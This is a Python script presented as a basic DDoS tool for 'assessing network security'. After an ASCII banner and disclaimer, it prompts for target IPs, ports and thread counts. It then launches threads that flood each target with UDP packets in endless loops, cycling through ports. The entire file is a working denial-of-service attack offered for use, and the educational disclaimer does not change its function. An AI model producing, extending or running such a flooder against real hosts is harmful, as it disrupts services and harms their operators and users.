import os
import time
import socket
import random
import threading

def display_banner():
    banner = r"""
 _____     _____     ______     ______        ______     ______   ______   ______     ______     __  __     ______     ______     
/\  __-.  /\  __-.  /\  __ \   /\  ___\      /\  __ \   /\__  _\ /\__  _\ /\  __ \   /\  ___\   /\ \/ /    /\  ___\   /\  == \    
\ \ \/\ \ \ \ \/\ \ \ \ \/\ \  \ \___  \     \ \  __ \  \/_/\ \/ \/_/\ \/ \ \  __ \  \ \ \____  \ \  _"-.  \ \  __\   \ \  __<    
 \ \____-  \ \____-  \ \_____\  \/\_____\     \ \_\ \_\    \ \_\    \ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  
  \/____/   \/____/   \/_____/   \/_____/      \/_/\/_/     \/_/     \/_/   \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_/ /_/  
    _                                _ ______  ________
    | |                              (_|_____ \(_______/
  _ | | ____ _   _     ____ ____  ___ _  ____) )  ____  
 / || |/ _  ) | | |   / ___) _  |/___) |/_____/  (___ \ 
( (_| ( (/ / \ V /   | |  ( ( | |___ | |_______ _____) )
 \____|\____) \_/    |_|   \_||_(___/|_(_______|______/
                                                        
"""
    print(banner)


display_banner()

# Terminal header settings and information
os.system('color 0A')
print("Developer   :   Rasindu Illangarathne")
print("Created Date:   2024-03-24")
print('Project     :   DDOS-Attack')
print('Purpose     :   A basic DDOS-attack tool to assess the security of your network')
print('Caution     :   Only for education, not for illegal activities.')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Type your ip and port number (find IP address using nslookup or any online website)
ips = input("IP Targets (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_size = int(input("Proxy Size : "))
threads = int(input("Number of threads : "))

# Lets start the attack
print("Thank you for using the rasi23 (DDOS-ATTACK-TOOL).")

time.sleep(3)
for ip in ips:
    for port in ports:
        # Use a bytes literal to create the data
        data = b'Hello, this is a DDOS attack'
        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
            t.start()           

# Lets keep the terminal clean
if os.name == "nt": # Windows
    os.system("cls")
else: # Linux or Mac
    os.system("clear")
input("Press Enter to exit...")
